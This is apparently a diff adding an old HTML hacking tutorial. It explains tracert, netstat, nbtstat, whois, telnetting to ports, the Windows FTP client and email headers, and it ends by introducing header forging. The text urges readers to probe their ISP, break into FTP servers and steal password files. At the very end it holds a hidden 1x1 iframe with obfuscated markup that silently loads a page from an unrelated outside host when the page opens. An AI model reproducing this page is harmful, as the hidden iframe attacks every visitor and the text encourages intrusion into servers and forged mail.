+<P><font face="Verdana" size="2">-h maximum_hops Maximum number of hops to search for target.</font></P>
+<P><font face="Verdana" size="2">-j host-list Loose source route along host-list.</font></P>
+<P><font face="Verdana" size="2">-w timeout Wait timeout milliseconds for each reply.</font></P>
+<P><font face="Verdana" size="2">Lets take an example of tracing the path taken by a datagram to reach hotmail.com from your machine.</font></P>
+<P><font face="Verdana" size="2">To do this simply type the following command:</font></P>
+<P><font face="Verdana" size="2">C:\windows&gt;tracert hotmail.com</font></P>
+<FONT FACE="Arial"> 
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+ </FONT>
+<P><font face="Verdana" size="2">Instead of Hotmail.com you can also write the IP address of Hotmail.com which you can get by doing an nslookup. Try tracert with different parameters and see what the result is. That is the best way to learn how this command works.</font></P>
+<B><P><font face="Verdana" size="2">Netstat</font> </P>
+</B><P><font face="Verdana" size="2">This is by far the most interesting hacking tool which gives some important information about your ISP.</font></P>
+<P><font face="Verdana" size="2">Netstat soesn't display any help information unless you type netstat /?. I got the following info:</font></P>
+<P><font face="Verdana" size="2">C:\WINDOWS&gt;netstat /?</font></P>
+<P><font face="Verdana" size="2">Displays protocol statistics and current TCP/IP network connections.</font></P>
+<P><font face="Verdana" size="2">NETSTAT [-a] [-e] [-n] [-s] [-p proto] [-r] [interval]</font></P>
+<P><font face="Verdana" size="2">-a Displays all connections and listening ports.</font></P>
+<P><font face="Verdana" size="2">-e Displays Ethernet statistics. This may be combined with the -s</font></P>
+<P><font face="Verdana" size="2">option.</font></P>
+<P><font face="Verdana" size="2">-n Displays addresses and port numbers in numerical form.</font></P>
+<P><font face="Verdana" size="2">-p proto Shows connections for the protocol specified by proto; proto</font></P>
+<P><font face="Verdana" size="2">may be TCP or UDP. If used with the -s option to display</font></P>
+<P><font face="Verdana" size="2">per-protocol statistics, proto may be TCP, UDP, or IP.</font></P>
+<P><font face="Verdana" size="2">-r Displays the routing table.</font></P>
+<P><font face="Verdana" size="2">-s Displays per-protocol statistics. By default, statistics are</font></P>
+<P><font face="Verdana" size="2">shown for TCP, UDP and IP; the -p option may be used to specify</font></P>
+<P><font face="Verdana" size="2">a subset of the default.</font></P>
+<P><font face="Verdana" size="2">interval Redisplays selected statistics, pausing interval seconds</font></P>
+<P><font face="Verdana" size="2">between each display. Press CTRL+C to stop redisplaying</font></P>
+<P><font face="Verdana" size="2">statistics. If omitted, netstat will print the current</font></P>
+<P><font face="Verdana" size="2">configuration information once.</font></P>
+<P><font face="Verdana" size="2">The -a parameter can be used to list the open ports on your computer and your IP address. I have explained it in the IP address section. For example,</font></P>
+<P><font face="Verdana" size="2">C:\windows&gt;netstat -a</font></P>
+<P><font face="Verdana" size="2">Will display the Kernal Routing Information, ports open on your machine, your IP, the IP of the host you are connected to and also the port of the host to which you are connected to.</font></P>
+<P><font face="Verdana" size="2">If you are logged into your shell account and give the netstat command then it may give the IP addresses of all people who are logged into that server at that moment. All these IP's are Dynamic of course.</font></P>
+<P><font face="Verdana" size="2">Another intersting command is the nbtstat command which too is a great tool to get excellent valuable info on a host your are connected to. For more info type nbtstat at the prompt.</font></P>
+<P><font face="Verdana" size="2">C:\windows&gt;nbtstat -A &lt;host&gt;</font></P>
+<P><font face="Verdana" size="2">The above-mentioned command will allow the hacker to obtain a list of usernames, system names, and domains.I will mention maore about this command in the Hacking Truths Manual on File Sharing.</font></P>
+<P><font face="Verdana" size="2">Arp and Route are extra elite comamnds which I do not think should be mentioned in a newbies manual. But all of you who want more info on any of these commands can either try simply typing the name of the command or the command name followed by /?</font></P>
+<P><font face="Verdana" size="2">Eg</font></P>
+<P><font face="Verdana" size="2">Command /?</font></P>
+<P><font face="Verdana" size="2">Will display help on the command.</font></P>
+<P><font face="Verdana" size="2">**********************</font></P>
+<P><font face="Verdana" size="2">Hacking Tip: ARP (Address Resolution Protocol) is used to translate IP addresses</font></P>
+<P><font face="Verdana" size="2">to Ethernet addresses. The translation is done only for outgoing IP</font></P>
+<P><font face="Verdana" size="2">packets, because this is when the IP header and the Ethernet header</font></P>
+<P><font face="Verdana" size="2">are created.</font></P>
+<P><font face="Verdana" size="2">IP address Ethernet address</font> </P>
+<OL>
+<OL>
+<OL>
+<OL>
+
+<LI><font face="Verdana" size="2">08-00-39-00-2F-C3</font></LI></OL>
+</OL>
+</OL>
+</OL>
+
+<P><font face="Verdana" size="2">Route is used to display info on the routing tables.</font></P>
+<P><font face="Verdana" size="2">**********************</font></P>
+<B><P><font face="Verdana" size="2">WHOIS: Getting Info about a Domain</font></P>
+</B><P><font face="Verdana" size="2">How do you get a .com registration? Well you register with Network Solutions give them some money and you have your own domain name i.e. your very own .com registration. Now all people who register with Network Solutions have to fill a form in which they have to enter information like Name, Contact Information , Email Address, IP address and much more. Now all this data or info is stored in a DataBase mentained by Network Solutions. You can perfom a query which is known as a Whois query and gather information on a particular domain or host. Say you want to find out the IP or the name of the person who owns the
+<A HREF="http://www.hotmail.com/">www.hotmail.com</A> domain,what do you do?</font></P>
+<P><font face="Verdana" size="2">Well either you could go to Network Solutions site or internic.net and enter hotmail.com in the input box or you can directly enter the following in the location bar of your Browser and make a whois enquiry.</font></P>
+<P><font face="Verdana" size="2">Enter the following in the location bar of your browser:</font></P>
+<P><A HREF="http://205.177.25.9/cgi-bin/whois?hotmail.com"><FONT face="Verdana" size=2>http://205.177.25.9/cgi-bin/whois?hotmail.com</FONT></A></P>
+<P><font face="Verdana" size="2">Note: Replace Hotmail.com with the domain name of which you want to perfom a WHOIS query.</font></P>
+<B><P><font face="Verdana" size="2">Manual Port Surfing</font></P>
+</B><P><font face="Verdana" size="2">You have obtained the list of open ports by using some canned hacking tool. Now what do you do? Connect to each port of the remote server i.e. your ISP.</font></P>
+<P><font face="Verdana" size="2">Now earlier I taught you a lame method of telnetting to a remote server. Now lets get to an cool method of connecting to a remote computer.You are not a Hacker if you do not telnet like this:</font></P>
+<P><font face="Verdana" size="2">C:\windows&gt; telnet hostname.com ###</font></P>
+<P><font face="Verdana" size="2">Well this command is pretty much self explanatory. Telnet calls the telnet program, Hostname is the hostname or the IP of the remote server and ### is the open port of the remote server you want to connect to.</font></P>
+<P><font face="Verdana" size="2">It is not necessary that as port 25 is normaly the SMTP port, each and every server would be running SMTP at port 25. It all varies from Server to server. If you learn Port surfing then you can connect to the FTP (21) daemon and download or upload files, connect to SMTP daemon and send mail even forged mail, POP (110) to receive mail and HTTP (80) to download web pages.</font></P>
+<P><font face="Verdana" size="2">OK get ready to explore the most common ports which are likely to be open on your ISP’s servers.</font></P>
+<P><font face="Verdana" size="2">Port 23 is the default port to which Telnet connects to if the port number is not given. Generally when we are connected to Port 23 of the remote server then we are greeted by a Welcome Banner and then we are given the Login Prompt. Generally connecting to Port 23 also gives the Name of the OS running at the remote server which is invaluable in finding exploits as a particular exploit may work only if the remote computer is running the same combination of service and Operating System.</font></P>
+<P><font face="Verdana" size="2">Basically connecting to Port 23 gives us the OS of the remote computer.</font> </P>
+<P><font face="Verdana" size="2">WIN 95/98/NT don't ship with telnet servers so unless the telnet server is installed Port 23 would no be open. So if Port 23 of your ISP is not open then it should be safe to think that the server is not runnign Win 95/98/NT. But you can never be sure just maybe your ISP has installed a telnet server and is running Windows.</font> </P>
+<P><font face="Verdana" size="2">Nowdays almost none of the ISP’s keep Port 23 open as the number of Hackers has really increased. Now lets move on to Port 21 or the FTP Port.</font></P>
+<P><font face="Verdana" size="2">Do you use Cute FTP or some other FTP client? Ever wondered how it works?</font></P>
+<B><P><font face="Verdana" size="2">FTP or Port 21 Explained</font></P>
+</B><P><font face="Verdana" size="2">First of all FTP stands for File Transfer Protocol.To read geek stuff on the FTP protocol read RFC 114 and RFC 959.</font></P>
+<P><font face="Verdana" size="2">FTP or File Transfer Protocol is a Protocol used to transfer files from a server to a client. Now a server would be the computer you are connected to and the client would be you yourself. To connect to a FTP server we need to have a FTP software known as the FTP client.This basically is protocol popular for tranfering files from the server to the client or vis-a-versa.So we can say that FTP servers will allow you to download and also upload files.</font></P>
+<P><font face="Verdana" size="2">LIST OF FTP SERVERS</font></P>
+<P><font face="Verdana" size="2">Unix FTPD</font></P>
+<P><font face="Verdana" size="2">Win9x WFTPD, Microsoft Frontpage</font></P>
+<P><font face="Verdana" size="2">Win NT IIS</font> </P>
+<P><font face="Verdana" size="2">Mac FTPD</font></P>
+<P><font face="Verdana" size="2">Well it is really a simple process of FTP’ing to your favourite site. Infact Windows itself ships with a FTP client which is quite lame and I do not at all recommand it, but still what the heck. How FTP is actually quite self explanatory, now the FTP Client i.e the program that you run at your computer first contacts the FTP daemon (Service running at Port 21) on the server specified, if the Server has a FTP daemon running then you might get a welcome screen which is also known as the Daemon Banner. A daemon Banner would be something that either displays a welcom emessage and info on the OS or service running on the host you have FTP'ed to.A daemon banner gives us valuable info on the host we connect to.Just remmember that if we want to get root or break into a FTP server then we need to search for a hole we can exploit, tand to search for a hole which we can exploit, we need to know the OS, the OS version and also the version on the FTP server running by the host. This means that say there is a FTP server which has 2 versions, one that runs in Windows and the other that runs in Unix. If say the Unix version has a hole, then it is not necessary that the Windows version too would have the same hole. A hole exists due to the combination of the Server running at the OS running at the host. This means even if the OS is different but the FTP server is the same, the hole would not work.So before you start to look for holes in the FTP server running at your ISP, just note down the OS version and the FTp server version running at your ISP.The daemon banner is followed by the Password Prompt. Something like the Following:</font></P>
+<FONT FACE="Arial">
+<P>
+</FONT><pre><font face="Verdana" size="2">
+Connected to web2.mtnl.net.in.
+220-
+220-#*************************************************************
+220-#           Welcome to MTNL's ftp site
+220-#*************************************************************
+220-#
+220-#  You can upload your own homepages at this site!!!
+220-#
+220-#  Just login with your username and upload the HTML pages.
+220-#  (You can use your favourite HTML editor as well)
+220-#
+220-#  World will see it at http://web2.mtnl.net.in/~yourusername/
+220-#
+220-#  So get going......UNLEASH YOUR CREATIVITY !!!!
+220-#
+220-#*************************************************************
+220-
+220 ftp2.mtnl.net.in FTP server ready.
+User (web2.mtnl.net.in:(none)): ankit
+331 Password required for ankit.
+Password:
+</font></pre>
+<P><font face="Verdana" size="2">Now most FTP daemons are badly configured, well actually I should say the system administrators allow Guest or anonymous Logins. What I mean by that is the FTP Daemon allows you to enter Guest or Anonymous as the Username. If you login through the Guest account, then it asks you for your email address, so that it can add to the server logs that you visited that site and used the FTP Daemon.</font></P>
+<P><font face="Verdana" size="2">Here instead of your true email address, you can make one up in your mind, just remember to put the @ sign in between and of course no spaces.</font></P>
+<B>
+<FONT FACE="Arial"><P>&nbsp;</P>
+</FONT>
+<P><font face="Verdana" size="2">So How Do I use the Windows FTP Client?</font></P>
+</B><P><font face="Verdana" size="2">Well first of all I think the FTP client which ships with Windows is not a GUI application.I personally do not like it and think you should either use your Favourite FTP Client or use the Telnet Application that ships with Windows to connect to Port 21.</font></P>
+<P><font face="Verdana" size="2">Anyway for those of who are die hard Microsoft fans or want to learn each and every thing in Windows, I will explain how this FTP Client is used. Actually this FTP program is quite powerful and it makes Hacking cool.</font></P>
+<P><font face="Verdana" size="2">If you use a GUI FTP program for hacking to impress your friends then they would probably say that anyone can use a GUI. This Windows FTP program may seem formidable to some at first sight.</font></P>
+<P><font face="Verdana" size="2">Now first of all goto MS DOS to run this program as it runs in DOS.Now type FTP to launch it.</font></P>
+<P><font face="Verdana" size="2">C:\WINDOWS&gt;ftp</font></P>
+<P><font face="Verdana" size="2">Your prompt will change to</font> </P>
+<P><font face="Verdana" size="2">ftp&gt;</font></P>
+<P><font face="Verdana" size="2">This is the FTP prompt and signifies that the FTP Client has been launched and is running.</font></P>
+<P><font face="Verdana" size="2">Now to transfer files or to do some FTP Hacking you need to know the FTP commands. To get a list of FTP commands type Help at the FTP prompt.</font></P>
+<P><font face="Verdana" size="2">ftp&gt; help</font></P>
+<P><font face="Verdana" size="2">Commands may be abbreviated. Commands are:</font></P>
+<P><font face="Verdana" size="2">! delete literal prompt send</font></P>
+<P><font face="Verdana" size="2">? debug ls put status</font></P>
+<P><font face="Verdana" size="2">append dir mdelete pwd trace</font></P>
+<P><font face="Verdana" size="2">ascii disconnect mdir quit type</font></P>
+<P><font face="Verdana" size="2">bell get mget quote user</font></P>
+<P><font face="Verdana" size="2">binary glob mkdir recv verbose</font></P>
+<P><font face="Verdana" size="2">bye hash mls remotehelp</font></P>
+<P><font face="Verdana" size="2">cd help mput rename</font></P>
+<P><font face="Verdana" size="2">close lcd open rmdir</font></P>
+<P><font face="Verdana" size="2">ftp&gt;</font></P>
+<P><font face="Verdana" size="2">You may get something like the above on your screen.Instead of typing Help you could also type ? that too would give the same result. Now to get Help on individual Commands type the following:</font></P>
+<P><font face="Verdana" size="2">ftp&gt;help [command]</font></P>
+<FONT FACE="Arial">
+<P>&nbsp;</P>
+</FONT>
+<P><font face="Verdana" size="2">Like say for example, I want to learn how to use the cd command what it does then I type the following:</font></P>
+<P><font face="Verdana" size="2">ftp&gt;help cd</font></P>
+<P><font face="Verdana" size="2">The FTP program will return this:</font></P>
+<P><font face="Verdana" size="2">cd Change remote working directory</font></P>
+<P><font face="Verdana" size="2">Note: Instead of the Above I could also have typed: ftp&gt;? Cd</font></P>
+<P><font face="Verdana" size="2">Different Commands:</font></P>
+<P><font face="Verdana" size="2">Now the Get command is used to get files from the server you are connected to.</font></P>
+<P><font face="Verdana" size="2">ftp&gt;get file.txt</font> </P>
+<P><font face="Verdana" size="2">This will get or download the text file with the name file.</font></P>
+<P><font face="Verdana" size="2">To download multiple files one cannot use the get command. The mget or the multiple gets command is used instead.(the m in mget stands for multiple)</font></P>
+<P><font face="Verdana" size="2">For example the following gets all text files from the host,</font></P>
+<P><font face="Verdana" size="2">ftp&gt;mget *.txt</font></P>
+<P><font face="Verdana" size="2">Say you want to upload a single file then you use the put command and to upload multiple files use the mput command.</font></P>
+<P><font face="Verdana" size="2">Say you are working in the Windows Directory and want to change to the c:\windows\temp directory while you are in the process of uploading files, so change the local directory use the lcd command.</font></P>
+<P><font face="Verdana" size="2">For example,</font></P>
+<P><font face="Verdana" size="2">ftp&gt;lcd temp</font></P>
+<P><font face="Verdana" size="2">This will make temp the current local working directory.</font></P>
+<P><font face="Verdana" size="2">The Bye or Close commands are basically terminating commands</font></P>
+<P><font face="Verdana" size="2">The ! commad allows you to escape to the shell at any moment.</font></P>
+<P><font face="Verdana" size="2">Another interesting command is the SYST command which gives us information on the server's OS and FTP server's version etc.This is excellent to get info on the host's OS cersion and FTP daemon's version, so that you can seacrh for it on the net.</font></P>
+<P><font face="Verdana" size="2">For a single line description of each command use the help or the ? command followed by the command you want info on.</font></P>
+<P><font face="Verdana" size="2">Now that you know some of the Basic FTP commands let me take you through the process of uploading your site to your ISP’s server. I am assuming that your ISP’s hostname is isp.net and all the files that have to uploaded to the ISP’s server are in the directory c:\Site</font></P>
+<P><font face="Verdana" size="2">First lets start my connecting or FTP’ing to your ISP. There are 2 ways to start a FTP session.First way is to pass an argument alognwith the Ftp Command i.e. you can directly connect to a host by typing ftp followed by the hostname. The second method involves firstly the launching of the FTP client and then using the Open command to connect to the host. Fot more info on the open command type help open</font></P>
+<P><font face="Verdana" size="2">For Example,</font></P>
+<P><font face="Verdana" size="2">C:\windows&gt;ftp isp.net</font></P>
+<P><font face="Verdana" size="2">Or</font></P>
+<P><font face="Verdana" size="2">C:\windows&gt;ftp</font></P>
+<P><font face="Verdana" size="2">ftp&gt;open isp.net</font></P>
+<P><font face="Verdana" size="2">In most cases after you have connected to the host i.e your ISP you will see the Welcome Banner or your ISP and then it will ask for a username and a password. Enter them. If you do not have them then try the Anonymous or the Guest Login or read on to learn to Hack into a FTP server.Anyway getting back to the uploading of the website. Now remember that the files you want to upload are in the c:\site directory but the current local working directory is Windows( It is normally the Default Directory in which MS DOS would open,) So before starting to upload files you need to change the Local working directory fromc:\windows to c:\site. So to this use the lcd command.</font></P>
+<P><font face="Verdana" size="2">For Example,</font></P>
+<P><font face="Verdana" size="2">ftp&gt;lcd c:\site</font></P>
+<P><font face="Verdana" size="2">Now you are set to upload the files, I am assuming that all files in the directory need to be uploaded, if that is not the case then use the WildCard " * " symbol and make the necessary selections.</font></P>
+<P><font face="Verdana" size="2">ftp&gt;mput *.*</font></P>
+<P><font face="Verdana" size="2">Voila you have just uploaded your own website by using a command line FTP program you have finally learnt to do without the GUI clients.</font></P>
+<P><font face="Verdana" size="2">You may say that all this stuff is stupid and you do not give a damn about uploading your site and want to learn how to break into FTP servers and steal passwords….well if you are reading this manual then I am sure you have no knowledge about how to hide your identity while connecting to a FTP server.You see whenevr you connect to a FTP server, any server for that matter, your IP is recorded in the Server log and when the system administartor finds that someone is downloading the passwords file, then I am pretty much sure that he would not be too pleased and you will find that the feds are fighting with the SS outside your house as to who gets to arrest you. It is illegal to download password file which is not available to the normal public.Now don't get the wrong idea that I am against hacking or something, but what I want you guys to understand is that I do not want you guys to get caught, and like I said before, if U reading this manual then you do not know how to edit the server logs and how to hide your identity, how to erase all your tracks from the victim's server and how to create a backdoor to the server so that you can access it whenever you want.</font></P>
+<B><P><font face="Verdana" size="2">Common FTP Hacks</font></P>
+</B><P><font face="Verdana" size="2">There are various FTP servers with various versions. No FTP server is fully clean of bugs. There are so many bugs that even if I write a line of each it would become too loooooooong. But you can seacrh for FTP bugs by finding out the FTP version number and the OS running at the host and searching for the hole at the following sites:</font></P>
+<P><A HREF="http://astalavista.box.sk/"><FONT face="Verdana" size=2>http://astalavista.box.sk</FONT></A></P>
+<P><A HREF="http://cert.org/"><FONT face="Verdana" size=2>http://cert.org</FONT></A></P>
+<P><A HREF="http://www.securityforce.com/"><FONT face="Verdana" size=2>http://www.securityforce.com</FONT></A></P>
+<P><A HREF="http://packetstorm.genocide.com/"><FONT face="Verdana" size=2>http://packetstorm.genocide.com</FONT></A></P>
+<P><A HREF="http://www.antionline.com/"><FONT face="Verdana" size=2>http://www.antionline.com</FONT></A></P>
+<P><A HREF="http://www.rootshell.com/"><FONT face="Verdana" size=2>http://www.rootshell.com</FONT></A></P>
+<P><A HREF="http://insecure.org/"><FONT face="Verdana" size=2>http://www.insecure.org</FONT></A></P>
+<P><A HREF="http://www.ntbugtraq.com/"><FONT face="Verdana" size=2>http://www.ntbugtraq.com</FONT></A></P>
+<P><font face="Verdana" size="2"><A HREF="http://support.microsoft.com/">http://support.microsoft.com</A> (Get Security Bulletins and Fixes to common holes on Windows systems)</font></P>
+<FONT FACE="Arial"> 
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+ </FONT>
+<P><font face="Verdana" size="2">Some common FTP Bugs would be the FTP bounce Attack and Local FTP bugs(Get Exploit files at antionline.com).There is also a DOS (Denial of Services, not MSDOS) attack which can be used to crash Win NT servers and also a OOB(Out of Band Attack). (Read all about it at:
+<A HREF="http://blacksun.box.sk/ftp.txt">http://blacksun.box.sk/ftp.txt</A> )</font></P>
+<B><P><font face="Verdana" size="2">SMTP [Port 25] &amp; POP [Port 110</font></B><font face="Verdana" size="2">]</font></P>
+<P><font face="Verdana" size="2">Most of you would be using email clients like MS Outlook, Netscape Messenger, Eudore or even Opera to send and receive mail. Have you ever wondered what exactly your favourite email client does? I will just give you an overview of what actually happens.</font></P>
+<P><font face="Verdana" size="2">Now when you compose and mail and click on Send, then your email client locates the mail server that you specified during Configuration time or suring Setup. Once the mail server is located, your email client by default connects to port 25(SMTP or the Simple Mail Transfer Protocol) to send mail. Now at Port 25 a daemon is running which listens for connections.Now your email client connects to this daemon and sends mail. Most mail servers have Sendmail which is also known as the buggiest daemon on earth installed on the SMTP port.Qmail is also another popular SMTP daemon running on most Web based email services' mail servers (eg. Hotmail is running qmail)</font></P>
+<P><font face="Verdana" size="2">Now in the other case i.e when you receive mail, your email client by default connects to port 110 i.e the POP3 or the Post Office Protocol (version 3) port.Once connected the POP3 daemon authenticates you i.e. asks for a user name and password which is automatically sent by your email client to the server.Once authenticated, you can receive mail.</font></P>
+<P><font face="Verdana" size="2">This means that to send mail you need no user name and password but to receive mail you need a username and password. Recently Yahoo, once it started providing POP based mail, had developed this problem that the user could not send mail unless he had received mail i.e he had authenticated.</font></P>
+<P><font face="Verdana" size="2">Now in the case of free Web Based services too the same thing happens. In this case you compose your email in a form whose action tag points to a CGI (or Common Gateway InterFace) script which sends the content of the form (that would be what you composed or typed out.) to the Sendmail deamon which uis running on Port 25 of the mail server of the company whose mail services you are using.Here you are authenticated once you enter your user name and password at the login page.Sendmail daemons of web based mail servers too can be used to send mail without authentication.</font></P>
+<P><font face="Verdana" size="2">************************</font></P>
+<P><font face="Verdana" size="2">UberHacker Note: Above I have assumed that you have some knowledge of Web development i.e. HTML or HyperText MarkUp Language and CGI.</font></P>
+<P><font face="Verdana" size="2">To Learn HTML goto:</font></P>
+<P><A HREF="http://www.htmlgoodies.com/"><FONT face="Verdana" size=2>www.htmlgoodies.com</FONT></A></P>
+<P><font face="Verdana" size="2">Search the MSDN Library, which I think simply the most amazing and the most comprehensive library containing all types of Tech Text. URL:
+<A HREF="http://msdn.microsoft.com/">http://msdn.microsoft.com</A></font></P>
+<P><font face="Verdana" size="2">Learn CGI programming with Perl 5 by reading my Perl Tutorials.</font></P>
+<P><font face="Verdana" size="2">*************************</font></P>
+<P><font face="Verdana" size="2">What is my mail server or which is the server I connect to send email.</font></P>
+<P><font face="Verdana" size="2">Now if you use the email service provided by your ISP then it is pretty simple to find out the mail server you connect to, to send and receive mail. Now say your ISP's name is xyz and their domain is xyz.com</font></P>
+<P><font face="Verdana" size="2">Then your mail server would most probably be</font></P>
+<P><font face="Verdana" size="2">mail.xyz.com (Port 25) to send mail and mail.xyz.com (Port 110) to receive mail.Instead of mail.xyz.com (Port 25) for sendmail mail, you can also try mailgw.xyz.com (Port 25).</font></P>
+<B><P><font face="Verdana" size="2">Email Headers</font> </P>
+</B><P><font face="Verdana" size="2">The Sendmail daemon is a really interesting one which allows you to get root on a badly configured system and also allows you to send fake mail!!!</font></P>
+<P><font face="Verdana" size="2">Well to understand the concept of Fake Mail you need to be more through with Email Headers, So let me start by explaining what email Headers actually are.</font></P>
+<P><font face="Verdana" size="2">This brings me back to the subject of what exactly happens when you send a mail, now let me resume from what happens after the Sendmail Daemon has sent your mail. Now say you live in Los Angeles and have sent an email to a friend in New York, so how does your email reach New York? Now once the Sendmail Daemon has composed your mail then it will send the mail to the Server whose Domain name is the same as the domain name that you entered, (In an email the Domain Name is the text after the @ sign.) So your email may be first sent to the server of the company that provides Internet Backbone is your Country and from there it would be sent to the server is which your friend has an account, so your email travels through a number of Routers and Servers before reaching your friend’s Inbox.</font></P>
+<P><font face="Verdana" size="2">Now whatever Server an email has travelled through is recorded in the Headers of the Email, the entire path taken by the email and other valuable info is provided by Email Headers.</font></P>
+<B><P><font face="Verdana" size="2">So How do I see Headers?</font></P>
+</B><P><font face="Verdana" size="2">Now to look at the complete Headers in Outlook Right click on the message and Select Properties, this will bring up a Window Showing only Partial Headers, Now to see the Full Headers clik on the Message Source Button. In Netscape you can look at Headers by clicking on View&gt;Headers&gt;Full.To learn about how to see full headers in your fav email client browse the Help of your client. So you did the above and now know that Headers contain some IP addresses and some Host Names. Now I will explain what exactly Headers Tell you.</font></P>
+<P><font face="Verdana" size="2">Return-Path: name@isp.net</font> </P>
+<P><font face="Verdana" size="2">Received: from mb04.isp.net by delhi1.mtnl.net.in</font></P>
+<P><font face="Verdana" size="2">(8.9.1/1.1.20.3/26Oct99-0620AM) id CAA0000022766; Tue, Feb 2000 02:47:11 +0530 (IST) Received: from s443026 (d212-151-82-176.isp.net [212.151.82.176]) by</font></P>
+<P><font face="Verdana" size="2">mb04.isp.net (8.8.8/8.8.8) with SMTP id WAA04589 for</font></P>
+<P><font face="Verdana" size="2">&lt;ankit@bol.net.in&gt;; Mon, 28 Feb 2000 22:12:56 +0100 (MET)</font></P>
+<P><font face="Verdana" size="2">From: "[Noname]" &lt;name@isp.net&gt;</font></P>
+<P><font face="Verdana" size="2">To: "Ankit Fadia" &lt;ankit@bol.net.in&gt;</font></P>
+<P><font face="Verdana" size="2">Subject: More questions :)</font></P>
+<P><font face="Verdana" size="2">Date:Mon, 28 Feb 2000 22:13:12 +0100</font></P>
+<P><font face="Verdana" size="2">Message-ID:&lt;LPBBIHMNOBJBBMANLFFIGEDNCAAA.noname@isp.net&gt;</font></P>
+<P><font face="Verdana" size="2">MIME-Version: 1.0</font></P>
+<P><font face="Verdana" size="2">Content-Type: text/plain; charset="iso-8859-1"</font></P>
+<P><font face="Verdana" size="2">Content-Transfer-Encoding: 7bit</font></P>
+<P><font face="Verdana" size="2">X-MSMail-Priority:Normal</font></P>
+<P><font face="Verdana" size="2">X-Mailer: Microsoft Outlook IMO, Build 9.0.2416 (9.0.2910.0)</font></P>
+<P><font face="Verdana" size="2">X-MimeOLE: Produced By Microsoft MimeOLE V5.00.2314.1300</font></P>
+<P><font face="Verdana" size="2">X-UIDL: c6189dbefa930101b3b63dd114d7e876</font></P>
+<P><font face="Verdana" size="2">Now lets look at the First line, It tells us that this message was sent by someone who has an account with the ISP whose hostname is isp.net and his UserName is name and is mail address is obviously
+<A HREF="mailto:haxor@yahoo.com">name@isp.net</A></font></P>
+<P><font face="Verdana" size="2">Now let’s look at the next few lines, it tell us what path the mail has taken or which servers has it gone through. Now the Line</font> </P>
+<B><P><font face="Verdana" size="2">Received: from mb04.isp.net by delhi1.mtnl.net.in</font></P>
+<P><font face="Verdana" size="2">(8.9.1/1.1.20.3/26Oct99-0620AM) id CAA0000022766; Tue, Feb 2000 02:47:11 +0530 (IST)</font></P>
+</B><P><font face="Verdana" size="2">Received: from s443026 (d212-151-82-176.isp.net [212.151.82.176]) by</font></P>
+<P><font face="Verdana" size="2">mb04.isp.net (8.8.8/8.8.8) with SMTP id WAA04589 for</font></P>
+<P><font face="Verdana" size="2">&lt;ankit@bol.net.in&gt;; Mon, 28 Feb 2000 22:12:56 +0100 (MET)</font></P>
+<FONT FACE="Arial">
+<P>&nbsp;</P>
+ </FONT>
+<P><font face="Verdana" size="2">Now to read the lines which reveal the servers through which the mail has travelled through, start reading in the order-bottom to top,to trace the path taken by the mail got transferred from the sender to the recepient, now this says that the message originated on the server s443026 whose IP would be 212.151.82.176 and whose hostname is d212-151-82-176.isp.net<I>.</I>From this server the mail travelled to <I>mb04.isp.net </I>. Now the thing in the Brackets is usually the Version of Sendmail that is running on that server. Now say you want the proper server log stored in this server which refers to this email, so you contact the system adminsitrator of this server and tell him that you want the Logs which correspond to the mail whose id is WAA04589. So that is what the id thing stands for. The rest of the Information is pretty much self explanatory, it says that the mail is for
+<A HREF="mailto:ankit@bol.net.in">ankit@bol.net.in</A> and it also mentions the date at which the mail was sent.</font></P>
+<P><font face="Verdana" size="2">The Next few lines are also quite self Explanatory:</font></P>
+<P><font face="Verdana" size="2">From: "[Noname]" &lt;noname@isp.net&gt;</font></P>
+<P><font face="Verdana" size="2">To: "Ankit Fadia" &lt;ankit@bol.net.in&gt;</font></P>
+<P><font face="Verdana" size="2">Subject: More questions :)</font></P>
+<P><font face="Verdana" size="2">Date:Mon, 28 Feb 2000 22:13:12 +0100</font></P>
+<P><font face="Verdana" size="2">Message-ID:&lt;LPBBIHMNOBJBBMANLFFIGEDNCAAA.noname@isp.net&gt;</font></P>
+<P><font face="Verdana" size="2">This tells us that the NickName of the person who has sent this mail is [Noname] and his mail address would be
+<A HREF="mailto:noname@swip.net">noname@isp.net</A>. The next line specifies the email address to which the mail was sent to. The other lines too are again pretty much self explanatory.</font></P>
+<P><font face="Verdana" size="2">MIME-Version: 1.0</font></P>
+<P><font face="Verdana" size="2">Content-Type: text/plain; charset="iso-8859-1"</font></P>
+<P><font face="Verdana" size="2">Content-Transfer-Encoding: 7bit</font></P>
+<P><font face="Verdana" size="2">X-MSMail-Priority:Normal</font></P>
+<P><font face="Verdana" size="2">X-Mailer: Microsoft Outlook IMO, Build 9.0.2416 (9.0.2910.0)</font></P>
+<P><font face="Verdana" size="2">X-MimeOLE: Produced By Microsoft MimeOLE V5.00.2314.1300</font></P>
+<P><font face="Verdana" size="2">X-UIDL: c6189dbefa930101b3b63dd114d7e876</font></P>
+<P><font face="Verdana" size="2">Now these lines give us the Mime Version, the content type and the Encoding used for transfer.The X-Mailer</font> </P>
+<P><font face="Verdana" size="2">Header tell’s us the Email client which sent the mail, in this case it is Microsoft Outlook IMO, Build 9.0.2416 (9.0.2910.0).The rest of the lines are not important and give us not so important details.</font></P>
+<P><font face="Verdana" size="2">Anyway, now that you know what exactly Headers are, lets learn how to Forge Headers, so that you can send mail from anyone’s account without knowing his Account Password, well actually this techinique allows us to send someone a email such that it would appear that the mail has been sent by a third person.</font></P>
+<P><font face="Verdana" size="2">Eg, now you can send an email to your friend by forging the email headers such that your friend thinks that this mail has been written or sent by Bill Gates whose email address would actually appear to be
+<A HREF="mailto:billgates@microsoft.com">billgates@microsoft.com</A></font></P>
+<P><font face="Verdana" size="2">Well that ends the first part of Net Tools, this is Ankit Fadia signing off.</font></P>
+<P><font face="Verdana" size="2">Ankit Fadia</font></P>
+<font face="Verdana" size="2">
+</FONT<P><A HREF="mailto:Ankit@bol.net.in">ankit@bol.net.in</A></font><P><font face="Verdana" size="2">To receive more tutorials on Hacking, Perl, C++ and Viruses/Trojans join my mailing list:</font></P>
+<P><font face="Verdana" size="2">Send an email to <A HREF="mailto:programmingforhackers-subscribe@egroups.com">programmingforhackers-subscribe@egroups.com</A> to join it.</font></P>
+<P><font face="Verdana" size="2">Visit my Site to view all tutorials written by me at:
+<A HREF="http://www.crosswinds.net/~hackingtruths">http://www.crosswinds.net/~hackingtruths</A></font></P>
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</BODY>
+</HTML>
+
+
+
+
+
+
+
+
+
